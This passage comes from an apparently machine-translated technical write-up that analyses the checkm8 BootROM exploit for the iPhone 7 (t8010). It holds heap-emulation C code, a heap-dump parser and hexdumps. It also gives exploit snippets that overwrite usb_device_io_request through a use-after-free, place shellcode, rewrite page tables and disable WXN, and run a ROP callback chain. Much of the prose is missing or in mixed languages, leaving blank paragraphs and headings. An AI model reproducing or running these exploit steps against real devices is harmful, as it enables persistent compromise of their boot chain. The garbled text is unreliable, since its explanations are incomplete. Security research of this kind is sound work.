struktur permintaan.  Jika ada bongkahan kecil di tengah ruang heap, beberapa alokasi dari kategori pertama akan masuk ke bongkahan ini, dan semua alokasi lainnya akan dipindahkan, yang dengannya kita dapat melimpahkan <code>usb_device_io_request</code> , merujuk pada buffer lama.  Secara skematis, ini dapat direpresentasikan sebagai berikut: </p><br><p><img src="https://habrastorage.org/webt/on/dl/dy/ondldygtgie2sho2l8xh8q5mlva.png"></p><br><p>  Untuk menghitung bias yang diperlukan, kami memutuskan untuk hanya meniru alokasi yang tercantum di atas, sedikit mengadaptasi kode sumber tumpukan <code>iBoot</code> . </p><br><div class="spoiler">  <b class="spoiler_title">Emulasi tumpukan DFU</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"heap.h"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #ifndef NOLEAK #define NOLEAK (8) #endif int main() { void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf("chunk = %p\n", chunk); heap_add_chunk(chunk, 0x100000, 1); malloc(0x3c0); //        SecureRAM void * descs[10]; void * io_req[100]; descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); const int N = NOLEAK; void * task = malloc(0x3c0); void * task_stack = malloc(0x4000); void * io_buf_0 = memalign(0x800, 0x40); void * hs = malloc(25); void * fs = malloc(25); void * zlps[2]; for(int i = 0; i &lt; N; i++) { io_req[i] = malloc(0x30); } for(int i = 0; i &lt; N; i++) { if(i &lt; 2) { zlps[i] = malloc(0x30); } free(io_req[i]); } for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_0); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 2; i++) { printf("zlps[%d] = %p\n", i, zlps[i]); } printf("**********\n"); for(int i = 0; i &lt; 5; i++) { free(descs[i]); } free(task); free(task_stack); free(io_buf_0); free(hs); free(fs); descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); task = malloc(0x3c0); task_stack = malloc(0x4000); void * io_buf_1 = memalign(0x800, 0x40); hs = malloc(25); fs = malloc(25); for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_1); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 5; i++) { io_req[i] = malloc(0x30); printf("io_req[%d] = %p\n", i, io_req[i]); } printf("**********\n"); printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0); printf("hs_off = %#lx\n", (int64_t)hs - (int64_t)io_buf_0); printf("fs_off = %#lx\n", (int64_t)fs - (int64_t)io_buf_0); return 0; }</span></span></span></span></code> </pre> </div></div><br><p>  Output program dengan 8 permintaan pada tahap <code>heap feng-shui</code> : </p><br><pre> <code class="plaintext hljs">chunk = 0x1004000 descs[0] = 0x1004480 descs[1] = 0x10045c0 descs[2] = 0x1004640 descs[3] = 0x10046c0 descs[4] = 0x1004800 task = 0x1004880 task_stack = 0x1004c80 io_buf = 0x1008d00 hs = 0x1009540 fs = 0x10095c0 zlps[0] = 0x1009a40 zlps[1] = 0x1009640 ********** descs[0] = 0x10096c0 descs[1] = 0x1009800 descs[2] = 0x1009880 descs[3] = 0x1009900 descs[4] = 0x1004480 task = 0x1004500 task_stack = 0x1004900 io_buf = 0x1008980 hs = 0x10091c0 fs = 0x1009240 io_req[0] = 0x10092c0 io_req[1] = 0x1009340 io_req[2] = 0x10093c0 io_req[3] = 0x1009440 io_req[4] = 0x10094c0 ********** io_req_off = 0x5c0 hs_off = 0x4c0 fs_off = 0x540</code> </pre> <br><p>  <code>usb_device_io_request</code> berikutnya akan berada pada offset <code>0x5c0</code> dari awal buffer sebelumnya, yang sesuai dengan kode exploit: </p><br><pre> <code class="python hljs">t8010_overwrite = <span class="hljs-string"><span class="hljs-string">'\0'</span></span> * <span class="hljs-number"><span class="hljs-number">0x5c0</span></span> t8010_overwrite += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;32x2Q'</span></span>, t8010_nop_gadget, callback_chain)</code> </pre> <br><p>       ,      <code>SecureRAM</code> ,      <code>checkm8</code> .     ,       .    ,    <code>usb_device_io_request</code>     ,       . </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python3 import struct from hexdump import hexdump with open('HEAP', 'rb') as f: heap = f.read() cur = 0x4000 def parse_header(cur): _, _, _, _, this_size, t = struct.unpack('&lt;QQQQQQ', heap[cur:cur + 0x30]) is_free = t &amp; 1 prev_free = (t &gt;&gt; 1) &amp; 1 prev_size = t &gt;&gt; 2 this_size *= 0x40 prev_size *= 0x40 return this_size, is_free, prev_size, prev_free while True: try: this_size, is_free, prev_size, prev_free = parse_header(cur) except Exception as ex: break print('chunk at', hex(cur + 0x40)) if this_size == 0: if cur in (0x9180, 0x9200, 0x9280): #    this_size = 0x80 else: break print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free) hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)]) cur += this_size</span></span></code> </pre> <br><p>         . ,        . </p><br><div class="spoiler"> <b class="spoiler_title">    SecureRAM</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">chunk at 0x4040 0x40 non-free 0x0 0 chunk at 0x4080 0x80 non-free 0x40 0 00000000: 00 41 1B 80 01 00 00 00 00 00 00 00 00 00 00 00 .A.............. 00000010: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................ 00000020: FF 00 00 00 00 00 00 00 68 3F 08 80 01 00 00 00 ........h?...... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x4100 0x140 non-free 0x80 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4240 0x240 non-free 0x140 0 00000000: 68 6F 73 74 20 62 72 69 64 67 65 00 00 00 00 00 host bridge..... 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4480 // descs[4], conf string 0x80 non-free 0x240 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x4500 // task 0x400 non-free 0x80 0 00000000: 6B 73 61 74 00 00 00 00 E0 01 08 80 01 00 00 00 ksat............ 00000010: E8 83 08 80 01 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4900 // task stack 0x4080 non-free 0x400 0 00000000: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000010: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000020: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000030: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000040: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000050: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000060: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000070: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000080: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 00000090: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000A0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats 000000B0: 6B 61 74 73 6B 61 74 73 6B 61 74 73 6B 61 74 73 katskatskatskats chunk at 0x8980 // io_buf 0x840 non-free 0x4080 0 00000000: 63 6D 65 6D 63 6D 65 6D 00 00 00 00 00 00 00 00 cmemcmem........ 00000010: 10 00 0B 80 01 00 00 00 00 00 1B 80 01 00 00 00 ................ 00000020: EF FF 00 00 00 00 00 00 10 08 0B 80 01 00 00 00 ................ 00000030: 4C CC 00 00 01 00 00 00 20 08 0B 80 01 00 00 00 L....... ....... 00000040: 4C CC 00 00 01 00 00 00 30 08 0B 80 01 00 00 00 L.......0....... 00000050: 4C CC 00 00 01 00 00 00 40 08 0B 80 01 00 00 00 L.......@....... 00000060: 4C CC 00 00 01 00 00 00 A0 08 0B 80 01 00 00 00 L............... 00000070: 00 06 0B 80 01 00 00 00 6C 04 00 00 01 00 00 00 ........l....... 00000080: 00 00 00 00 00 00 00 00 78 04 00 00 01 00 00 00 ........x....... 00000090: 00 00 00 00 00 00 00 00 B8 A4 00 00 01 00 00 00 ................ 000000A0: 00 00 0B 80 01 00 00 00 E4 03 00 00 01 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 34 04 00 00 01 00 00 00 ........4....... chunk at 0x91c0 // hs config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x9240 // ls config 0x80 non-free 0x0 0 00000000: 09 02 19 00 01 01 05 80 FA 09 04 00 00 00 FE 01 ................ 00000010: 00 00 07 21 01 0A 00 00 08 00 00 00 00 00 00 00 ...!............ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x92c0 0x80 non-free 0x0 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 6C CC 00 00 01 00 00 00 00 08 0B 80 01 00 00 00 l............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9340 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF C0 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 48 DE 00 00 01 00 00 00 C0 93 1B 80 01 00 00 00 H............... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x93c0 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 94 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9440 0x80 non-free 0x80 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x94c0 0x180 non-free 0x80 0 00000000: E4 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9640 // zlps[1] 0x80 non-free 0x180 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x96c0 // descs[0], Nonce 0x140 non-free 0x80 0 00000000: EA 03 20 00 4E 00 4F 00 4E 00 43 00 3A 00 35 00 .. .NONC:.5. 00000010: 35 00 46 00 38 00 43 00 41 00 39 00 37 00 41 00 5.F.8.CA9.7.A. 00000020: 46 00 45 00 36 00 30 00 36 00 43 00 39 00 41 00 FE6.0.6.C.9.A. 00000030: 41 00 31 00 31 00 32 00 44 00 38 00 42 00 37 00 A.1.1.2.D.8.B.7. 00000040: 43 00 46 00 33 00 35 00 30 00 46 00 42 00 36 00 CF3.5.0.FB6. 00000050: 35 00 37 00 36 00 43 00 41 00 41 00 44 00 30 00 5.7.6.CAAD0. 00000060: 38 00 43 00 39 00 35 00 39 00 39 00 34 00 41 00 8.C.9.5.9.9.4.A. 00000070: 46 00 32 00 34 00 42 00 43 00 38 00 44 00 32 00 F.2.4.BC8.D.2. 00000080: 36 00 37 00 30 00 38 00 35 00 43 00 31 00 20 00 6.7.0.8.5.C.1. . 00000090: 53 00 4E 00 4F 00 4E 00 3A 00 42 00 42 00 41 00 SNON:.BBA 000000A0: 30 00 41 00 36 00 46 00 31 00 36 00 42 00 35 00 0.A.6.F.1.6.B.5. 000000B0: 31 00 37 00 45 00 31 00 44 00 33 00 39 00 32 00 1.7.E.1.D.3.9.2. chunk at 0x9800 // descs[1], Manufacturer 0x80 non-free 0x140 0 00000000: 16 03 41 00 70 00 70 00 6C 00 65 00 20 00 49 00 ..Apple .I. 00000010: 6E 00 63 00 2E 00 D6 D7 D8 D9 DA DB DC DD DE DF nc............ 00000020: E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF ................ 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9880 // descs[2], Product 0x80 non-free 0x80 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x9900 // descs[3], Serial number 0x140 non-free 0x80 0 00000000: C6 03 43 00 50 00 49 00 44 00 3A 00 38 00 30 00 ..CPID:.8.0. 00000010: 31 00 30 00 20 00 43 00 50 00 52 00 56 00 3A 00 1.0. .CPRV:. 00000020: 31 00 31 00 20 00 43 00 50 00 46 00 4D 00 3A 00 1.1. .CPFM:. 00000030: 30 00 33 00 20 00 53 00 43 00 45 00 50 00 3A 00 0.3. .SCEP:. 00000040: 30 00 31 00 20 00 42 00 44 00 49 00 44 00 3A 00 0.1. .BDID:. 00000050: 30 00 43 00 20 00 45 00 43 00 49 00 44 00 3A 00 0.C. .ECID:. 00000060: 30 00 30 00 31 00 41 00 34 00 30 00 33 00 36 00 0.0.1.A.4.0.3.6. 00000070: 32 00 30 00 34 00 35 00 45 00 35 00 32 00 36 00 2.0.4.5.E.5.2.6. 00000080: 20 00 49 00 42 00 46 00 4C 00 3A 00 33 00 43 00 .IBFL:.3.C. 00000090: 20 00 53 00 52 00 54 00 47 00 3A 00 5B 00 69 00 .SRTG:.[.i. 000000A0: 42 00 6F 00 6F 00 74 00 2D 00 32 00 36 00 39 00 Boot-.2.6.9. 000000B0: 36 00 2E 00 30 00 2E 00 30 00 2E 00 31 00 2E 00 6...0...0...1... chunk at 0x9a40 // zlps[0] 0x80 non-free 0x140 0 00000000: 80 00 00 00 00 00 00 00 00 89 08 80 01 00 00 00 ................ 00000010: FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 40 96 1B 80 01 00 00 00 ........@....... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x9ac0 0x46540 free 0x80 0 00000000: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 F8 8F 08 80 01 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</code> </pre> </div></div><br><p>     ,    <code>High Speed</code>  <code>Full Speed</code> ,     <code>IO</code> -.          , ,  ,      .      ,     . </p><br><h2 id="2-allokaciya-i-osvobozhdenie-io-bufera-bez-ochistki-globalnogo-sostoyaniya"> 2.    IO-     </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0x800</span></span>, <span class="hljs-number"><span class="hljs-number">0.0001</span></span>) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>) dfu.release_device(device)</code> </pre> <br><p>      <code>OUT</code> -   .      ,   <code>io_buffer</code>      .    <code>DFU</code>    <code>DFU_CLR_STATUS</code> ,      <code>DFU</code> . </p><br><h2 id="3-perezapis-usb_device_io_request-v-kuche-s-pomoschyu-use-after-free"> 3.  <code>usb_device_io_request</code>     <code>use-after-free</code> </h2><br><pre> <code class="python hljs">device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, t8010_overwrite, <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p>      <code>usb_device_io_request</code>        <code>t8010_overwrite</code> ,       . </p><br><p>  <code>t8010_nop_gadget</code>  <code>0x1800B0800</code>    <code>callback</code>  <code>next</code>  <code>usb_device_io_request</code> . </p><br><p> <code>t8010_nop_gadget</code>      ,         ,       <code>LR</code> , -    <code>free</code>  <code>callback</code> -  <code>usb_core_complete_endpoint_io</code> .  ,        ,          . </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] // restore fp, lr bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> <code>next</code>   <code>INSECURE_MEMORY + 0x800</code> .  <code>INSECURE_MEMORY</code>     ,    <code>0x800</code>     <code>callback-chain</code> ,     . </p><br><h2 id="4-razmeschenie-poleznoy-nagruzki"> 4.    </h2><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, len(payload), <span class="hljs-number"><span class="hljs-number">0x800</span></span>): libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x21</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, payload[i:i+<span class="hljs-number"><span class="hljs-number">0x800</span></span>], <span class="hljs-number"><span class="hljs-number">50</span></span>)</code> </pre> <br><p>            .      : </p><br><pre> <code class="plaintext hljs">0x1800B0000: t8010_shellcode #  shell-code ... 0x1800B0180: t8010_handler #   usb- ... 0x1800B0400: 0x1000006a5 #     #  SecureROM (0x100000000 -&gt; 0x100000000) #        ... 0x1800B0600: 0x60000180000625 #     #  SecureRAM (0x180000000 -&gt; 0x180000000) #        0x1800B0608: 0x1800006a5 #     #    0x182000000  0x180000000 #           0x1800B0610: disabe_wxn_arm64 #    WXN 0x1800B0800: usb_rop_callbacks # callback-chain</code> </pre> <br><h2 id="5-ispolnenie-callback-chain"> 5.  <code>callback-chain</code> </h2><br><pre> <code class="python hljs">dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p>   <code>USB</code>     <code>usb_device_io_request</code>        .        ,       <code>callback</code> .       : </p><br><pre> <code class="plaintext hljs">bootrom:000000010000CC4C LDP X8, X10, [X0,#0x70] ; X0 - usb_device_io_request pointer; X8 = arg0, X10 = call address bootrom:000000010000CC50 LSL W2, W2, W9 bootrom:000000010000CC54 MOV X0, X8 ; arg0 bootrom:000000010000CC58 BLR X10 ; call bootrom:000000010000CC5C CMP W0, #0 bootrom:000000010000CC60 CSEL W0, W0, W19, LT bootrom:000000010000CC64 B loc_10000CC6C bootrom:000000010000CC68 ; --------------------------------------------------------------------------- bootrom:000000010000CC68 bootrom:000000010000CC68 loc_10000CC68 ; CODE XREF: sub_10000CC1C+18↑j bootrom:000000010000CC68 MOV W0, #0 bootrom:000000010000CC6C bootrom:000000010000CC6C loc_10000CC6C ; CODE XREF: sub_10000CC1C+48↑j bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p>  ,   <code>0x70</code>            .          <code>f(x)</code>   <code>f</code>  <code>x</code> . </p><br><p>      ,  <code>Unicorn Engine</code> .          <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">uEmu</a> . </p><br><p><img src="https://habrastorage.org/webt/ri/b2/me/rib2mefgpchdxbiro3ukyyyjzt0.png"></p><br><p>      <code>iPhone 7</code>    . </p><br><h4 id="51-dc_civac-0x1800b0600">  5.1. <code>dc_civac 0x1800B0600</code> </h4><br><pre> <code class="plaintext hljs">000000010000046C: SYS #3, c7, c14, #1, X0 0000000100000470: RET</code> </pre> <br><p>        .    ,          . </p><br><h4 id="52-dmb">  5.2. <code>dmb</code> </h4><br><pre> <code class="plaintext hljs">0000000100000478: DMB SY 000000010000047C: RET</code> </pre> <br><p>  ,      ,    .   ,            ,   . </p><br><h4 id="53-enter_critical_section">  5.3. <code>enter_critical_section()</code> </h4><br><p>         . </p><br><h4 id="54-write_ttbr00x1800b0000">  5.4. <code>write_ttbr0(0x1800B0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p>      <code>TTBR0_EL1</code>  <code>0x1800B0000</code> .   <code>INSECURE MEMORY</code> ,     .    ,         : </p><br><pre> <code class="plaintext hljs">... 0x1800B0400: 0x1000006a5 0x100000000 -&gt; 0x100000000 (rx) ... 0x1800B0600: 0x60000180000625 0x180000000 -&gt; 0x180000000 (rw) 0x1800B0608: 0x1800006a5 0x182000000 -&gt; 0x180000000 (rx) ...</code> </pre> <br><h4 id="55-tlbi">  5.5. <code>tlbi</code> </h4><br><pre> <code class="plaintext hljs">0000000100000434: DSB SY 0000000100000438: SYS #0, c8, c7, #0 000000010000043C: DSB SY 0000000100000440: ISB 0000000100000444: RET</code> </pre> <br><p>      ,          . </p><br><h4 id="56-0x1820b0610---disable_wxn_arm64">  5.6. <code>0x1820B0610 - disable_wxn_arm64</code> </h4><br><pre> <code class="plaintext hljs">MOV X1, #0x180000000 ADD X2, X1, #0xA0000 ADD X1, X1, #0x625 STR X1, [X2,#0x600] DMB SY MOV X0, #0x100D MSR SCTLR_EL1, X0 DSB SY ISB RET</code> </pre> <br><p>   <code>WXN</code> (Write permission implies Execute-never),       <code>RW</code> .     <code>WXN</code>  -      . </p><br><h4 id="57-write_ttbr00x1800a0000">  5.7. <code>write_ttbr0(0x1800A0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p>      <code>TTBR0_EL1</code> .       <code>BootROM</code>    ,     <code>INSECURE_MEMORY</code>  . </p><br><h4 id="58-tlbi"> 5.8. <code>tlbi</code> </h4><br><p>     . </p><br><h4 id="59-exit_critical_section"> 5.9. <code>exit_critical_section()</code> </h4><br><p>      . </p><br><h4 